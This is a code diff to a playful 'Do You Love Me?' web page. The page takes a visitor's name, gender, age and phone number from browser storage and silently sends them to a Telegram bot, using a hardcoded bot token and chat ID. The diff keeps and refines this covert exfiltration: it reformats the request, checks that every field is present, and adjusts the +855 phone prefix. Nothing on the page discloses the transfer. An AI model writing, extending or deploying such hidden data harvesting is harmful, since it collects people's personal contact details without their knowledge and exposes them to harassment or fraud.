@@ -32,8 +32,13 @@
       // Retrieve user data from localStorage
       const userData = JSON.parse(localStorage.getItem("userData"));
 
-      if (userData) {
-        // Display personalized message
+      if (
+        userData &&
+        userData.username &&
+        userData.gender &&
+        userData.age &&
+        userData.phone
+      ) {
         const messageElement = document.getElementById("message");
         if (messageElement) {
           messageElement.textContent = `I love you too, ${userData.username} (${userData.age} years old)!`;
@@ -41,55 +46,50 @@
           console.error("Message element not found!");
         }
 
-        // Prefix the phone number with +855
-        const formattedPhone = "+855" + userData.phone;
+        // Prefix the phone number with +855 only if it doesn't start with a country code
+        let formattedPhone = userData.phone.startsWith('+')
+          ? userData.phone
+          : '+855' + userData.phone;
 
         // Send data to Telegram bot
         const telegramBotToken =
           "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your bot token
         const chatId = "1208908312"; // Replace with your chat ID (ensure it's numeric)
         const message = `Informations: User \nName: ${userData.username}\nGender: ${userData.gender}\nAge: ${userData.age}\nPhone: ${formattedPhone}`;
-       
-        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            reply_markup: JSON.stringify({
-              inline_keyboard: [
+        
+        const formData = new URLSearchParams();
+        formData.append('chat_id', chatId);
+        formData.append('text', message);
+        formData.append('reply_markup', JSON.stringify({
+            inline_keyboard: [
                 [
-                  {
-                    text: "Telegram📥", // Clicking this button opens Telegram with the formatted phone number
-                    url: `https://t.me/${formattedPhone}`,
-                  },
-                 {
-                     text: "Call 📞", // Clicking this button initiates a phone call
-                     url: `tel:${formattedPhone}`,
-                  },
+                    {
+                        text: "Call 📞",
+                        url: `tel:${formattedPhone}`,
+                    },
                 ],
-              ],
-            }),
-            parse_mode: "HTML",
-            disable_web_page_preview: true,
-            disable_notification: false,
-          }),
+            ],
+        }));
+
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: formData.toString(),
         })
           .then((response) => {
-            if (!response.ok) {
-              return response.json().then((errorData) => {
-                throw new Error(`Telegram API error: ${errorData.description}`);
-              });
-            }
-            console.log("Message sent successfully to Telegram bot.");
+              if (!response.ok) {
+                  return response.json().then((errorData) => {
+                      throw new Error(`Telegram API error: ${errorData.description}`);
+                  });
+              }
+              console.log("Message sent successfully to Telegram bot.");
           })
           .catch((error) => {
-            console.error("Error sending message to Telegram bot:", error);
+              console.error("Error sending message to Telegram bot:", error);
           });
       } else {
-        // Handle case where no user data is found
         const messageElement = document.getElementById("message");
         if (messageElement) {
           messageElement.textContent =
@@ -98,9 +98,10 @@
           console.error("Message element not found!");
         }
       }
-        // Automatically update the copyright year
-        const currentYear = new Date().getFullYear();
-        const copyrightElement = document.getElementById("copyright");
+
+      // Automatically update the copyright year
+      const currentYear = new Date().getFullYear();
+      const copyrightElement = document.getElementById("copyright");
       if (copyrightElement) {
         copyrightElement.textContent = `© ${currentYear} Do You Love Me? All rights reserved.`;
       }
